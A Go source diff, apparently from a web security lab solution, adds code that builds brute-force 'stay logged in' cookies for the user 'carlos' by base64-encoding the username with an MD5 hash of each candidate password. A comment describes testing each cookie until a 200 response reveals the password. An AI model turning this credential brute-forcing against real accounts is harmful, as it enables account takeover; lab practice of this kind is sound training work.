@@ -1,9 +1,12 @@
 package main
 
 import (
+	"fmt"
 	"log"
 	"io/ioutil"
 	"strings"
+	"crypto/md5"
+	base64 "encoding/base64"
 )
 
 func solve(hostname string) {
@@ -22,6 +25,8 @@ func solve(hostname string) {
 			- If redirect (302 http status), try again
 			- Otherwise (200 http status), the password is known!
 	*/
+	targetUser := "carlos"
+
 	candidatePasswords, err := readFromFile("assets/candidate-passwords.txt")
 
 	if err != nil {
@@ -30,6 +35,11 @@ func solve(hostname string) {
 	}
 
 	log.Printf("Found %d candidates passwords", len(candidatePasswords))
+
+	for _, password := range candidatePasswords {
+		cookieValue := createCookieValue(targetUser, password)
+		log.Printf("Cookie value: %s", cookieValue)
+	}
 }
 
 
@@ -43,6 +53,11 @@ func readFromFile(filePath string) ([]string, error) {
 	return strings.Split(string(fileBytes), "\n"), nil
 }
 
+func createCookieValue(user string, password string) string {
+	passwordMD5 := md5.Sum([]byte(password))
+	dataToEncode := fmt.Sprintf("%s:%x", user, passwordMD5)
+	return base64.StdEncoding.EncodeToString([]byte(dataToEncode))
+}
 
 func main() {
 	log.SetFlags(log.LstdFlags | log.Lmicroseconds)
